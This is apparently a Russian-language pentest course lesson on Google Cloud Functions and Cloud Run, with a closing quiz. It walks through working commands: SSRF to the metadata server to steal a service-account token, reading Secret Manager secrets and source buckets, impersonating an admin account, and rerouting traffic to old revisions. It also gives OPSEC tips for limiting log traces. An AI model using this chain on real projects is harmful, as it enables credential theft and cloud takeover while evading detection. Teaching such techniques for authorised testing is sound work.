---
id: cloud-gcp-functions
title: "Cloud Functions и Cloud Run: инъекции и захват service account"
category: cloud
parent: cloud-gcp-deep
difficulty: hard
order: 2
tags: [cloud, gcp, cloud-functions, cloud-run, serverless, sa, injection]
prerequisites: [cloud-gcp-deep, cloud-gcp-metadata]
useful_for:
  - "Пентест серверлесс-нагрузок GCP"
  - "Захват runtime service account"
  - "Инъекции через источники событий"
estimated_minutes: 50
summary: "Как устроены Cloud Functions (1st/2nd gen) и Cloud Run, как находить публичные эндпоинты, инъекции и слабые права, и как из функции/сервиса захватить runtime service account и данные."
---

## Задача

Ты нашёл публичный эндпоинт `https://shop-api-abc.a.run.app/` — это **Cloud Run**, серверлесс-контейнер Google. Как из публичного сервиса получить доступ к облаку? Cloud Run исполняется под **runtime service account (SA)** — сервисной учётной записью, у которой есть права на Secret Manager, Storage, БД. Задача урока — найти публичный или уязвимый сервис, захватить его SA и использовать это дальше.

## Что такое Cloud Functions и Cloud Run

**Cloud Functions** — серверлесс-функции: код запускается по триггеру (HTTP, Pub/Sub, Storage). **Cloud Functions 2nd gen** построена на Cloud Run. **Cloud Run** — контейнерный сервис: каждая версия кода — **ревизия** (`revision`), образ лежит в Artifact Registry.

Общее для обеих платформ:

- **Runtime service account** — идентичность исполнения; её токен доступен через metadata-сервис.
- **Ingress** — откуда доступен сервис (`all`, `internal`).
- **Публичность** — роль `roles/run.invoker` для `allUsers` делает сервис вызываемым без аутентификации.
- **Sources bucket** — 1st gen хранит исходники в `gcf-sources-*`.

Опасные конфигурации: `allUsers` invoker, runtime SA с широкими ролями (`Editor`, `secretmanager.secretAccessor` на всё), секреты в переменных окружения, ingress `all` для внутренних сервисов, устаревшие ревизии с доступом.

## Данные, с которыми работаем

Разведка сервисов:

```bash
$ gcloud run services list
SERVICE    REGION        URL
shop-api   europe-west1  https://shop-api-abc-ew.a.run.app
$ gcloud run services describe shop-api --region europe-west1 \
    --format='value(spec.template.spec.serviceAccountName)'
shop-api@my-project.iam.gserviceaccount.com
```

У сервиса есть собственный SA `shop-api`. Проверяем публичность:

```bash
$ gcloud run services get-iam-policy shop-api --region europe-west1 \
    --format=json | jq '.bindings[] | select(.role=="roles/run.invoker")'
{"role":"roles/run.invoker","members":["allUsers"]}
```

`allUsers` — сервис вызывается без аутентификации. Это наша точка входа.

## Шаг 1: находим инъекцию

Публичный вызов сам по себе даёт только функциональность сервиса. Ищем уязвимость — например, SSRF в параметре `url`:

```bash
$ curl -s "https://shop-api-abc-ew.a.run.app/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google" | jq -r '.access_token' | cut -c1-15
ya29.c.b0Aa
```

SSRF с заголовком `Metadata-Flavor: Google` отдал токен runtime SA. Если SSRF не умеет заголовки — ищем другой путь (см. `cloud-gcp-metadata`).

## Шаг 2: используем токен

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/my-project/secrets" | jq -r '.secrets[].name'
projects/my-project/secrets/db-password
projects/my-project/secrets/stripe-key
```

Читаем секреты и идём дальше. Проверяем также Firestore и Storage.

## Шаг 3: читаем исходники

В 1st gen исходники лежат в бакете. Если у SA есть `storage.objects.get`, читаем код и находим другие эндпоинты и секреты:

```bash
$ gsutil ls gs://gcf-sources-*/ 2>/dev/null
gs://gcf-sources-123-my-project/function-shop/main.py
$ gsutil cat gs://gcf-sources-123-my-project/function-shop/main.py | grep -iE 'token|secret|password'
STRIPE_KEY = os.environ["STRIPE_KEY"]
```

## Шаг 4: имперсонация

Проверяем `getAccessToken` — это ускоряет эскалацию:

```bash
$ curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | jq -r '.accessToken' | cut -c1-15
ya29.c.b0Aa
```

## Полный прогон от начала до конца

1. `run services list` → публичный `shop-api` с SA `shop-api@`.
2. `get-iam-policy` → `allUsers` invoker.
3. SSRF с заголовком → токен runtime SA.
4. Secret Manager → `db-password`, `stripe-key`.
5. `gcf-sources-*` → исходники с секретами.
6. `generateAccessToken` → имперсонация admin SA.

## Если не сработало

- **Ingress `internal`.** Снаружи вызов не пройдёт, но из другого ресурса в VPC — пройдёт.
- **Приватный сервис.** Нужен **identity token** (OIDC), а не access token: `gcloud auth print-identity-token`. Если можешь имперсонировать SA с `run.invoker` — вызов пройдёт.
- **Нет env.** Секреты могут подтягиваться через `--set-secrets` в рантайме, а не лежать в env.
- **Старые ревизии.** Cloud Run хранит историю ревизий; старая с широкими правами может быть доступна по тегу.
- **Инъекция через события.** Если функция подписана на Pub/Sub или Storage, а у тебя есть право `pubsub.topics.publish` или `storage.objects.create`, подсунутое событие исполнится от имени SA функции.
- **Artifact Registry.** При праве на чтение репозитория скачай образ и поищи секреты внутри.

## Cloud Run: ревизии и трафик

У Cloud Run есть особенности, полезные атакующему. **Ревизии** неизменяемы, но старые продолжают существовать: если у прошлой ревизии был широкий SA или открытый эндпоинт, она может быть доступна по тегу. При праве `run.services.update` можно направить трафик на старую ревизию:

```bash
$ gcloud run services update-traffic shop-api --to-revisions=shop-api-00001-abc=100 --region europe-west1
```

Ещё: **VPC connector** делает из сервиса pivot во внутреннюю сеть, а `min-instances` держит экземпляр живым (удобно для отладки).

## OPSEC и заметность

Serverless-атаки заметны по-разному. Вызов публичного эндпоинта пишется в логи сервиса и в Cloud Run request logs; чтение Secret Manager — в Cloud Audit Logs; имперсонация — в `GenerateAccessToken`. Если ты эксплуатируешь инъекцию, твой ввод останется в логах приложения. Практические соображения: используй существующие эндпоинты вместо развёртывания своих, не включай verbose-логи, минимизируй число обращений к Secret Manager (каждое `AccessSecretVersion` логируется). Для пентеста важен воспроизводимый путь, но помни, что защита может отреагировать на аномальный доступ.

## Типовые мисконфиги

Самые частые ошибки: `allUsers` invoker на сервисе, runtime SA с ролью `Editor` или `secretmanager.secretAccessor` на всё, секреты в переменных окружения (`--set-env-vars`), ingress `all` для внутренних сервисов, старая ревизия с широким SA. Любая из них превращает серверлесс-сервис в точку входа к проекту.

## Что мы теперь знаем

- Cloud Run/Functions исполняются под runtime SA, чей токен доступен через metadata.
- `allUsers` + `invoker` делает сервис публичным.
- Для приватного Cloud Run нужен identity token (OIDC), а не access token.
- Исходники 1st gen лежат в `gcf-sources-*`; ревизии Cloud Run ссылаются на образы Artifact Registry.
- Инъекция через источник событий запускает код функции с её SA.

## На что смотреть дальше

- **cloud-gcp-metadata**: как забрать токен SA, если SSRF не умеет заголовки.
- **cloud-gcp-iam**: что делать с токеном и имперсонацией.
- **cloud-serverless-injection**: инъекции через события как общий класс.

## Квиз

Проверь себя.

```quiz
- question: "Что означает роль roles/run.invoker для allUsers?"
  options:
    - "Сервис Cloud Run можно вызвать без аутентификации"
    - "Только администратор может вызвать"
    - "Сервис отключён"
    - "Сервис доступен только из VPC"
  answer: 0
  explanation: "allUsers + run.invoker делает сервис публичным."
- question: "Под какой идентичностью исполняется Cloud Run сервис?"
  options:
    - "Под runtime service account, заданным в шаблоне"
    - "Под вашим личным аккаунтом"
    - "Под анонимным пользователем"
    - "Под node SA всегда"
  answer: 0
  explanation: "Ревизия запускается от имени указанного service account."
- question: "Где в Cloud Functions 1st gen лежат исходники?"
  options:
    - "В бакете gcf-sources-* в Cloud Storage"
    - "В Secret Manager"
    - "В Firestore"
    - "В Artifact Registry"
  answer: 0
  explanation: "Исходники 1st gen хранятся в gcf-sources-бакете."
- question: "Какой токен нужен для вызова приватного Cloud Run?"
  options:
    - "Identity token (OIDC)"
    - "Access token OAuth"
    - "API-ключ"
    - "SAS-токен"
  answer: 0
  explanation: "Приватный Cloud Run требует OIDC identity token с aud сервиса."
- question: "Почему старые ревизии Cloud Run опасны?"
  options:
    - "Они неизменяемы и могут оставаться доступными с широким SA или открытым эндпоинтом"
    - "Они дешевле"
    - "Они удаляют данные"
    - "Они отключают IAM"
  answer: 0
  explanation: "Ревизии хранятся, и старая уязвимая версия может быть возвращена в трафик."
```

## Куда дальше

В следующем уроке мы разберём **GCP IAM** — роли и `setIamPolicy`. А пока главное запомни: **публичный Cloud Run — это точка входа к его runtime SA, а исходники и ревизии часто раскрывают секреты.**

## Где пригодится

- **Пентест GCP:** серверлесс-нагрузки и их SA.
- **Bug bounty:** публичные `*.run.app` и `cloudfunctions.net`.
- **Red team:** захват SA и эскалация.
- **Blue team:** аудит IAM-политик сервисов и секретов.
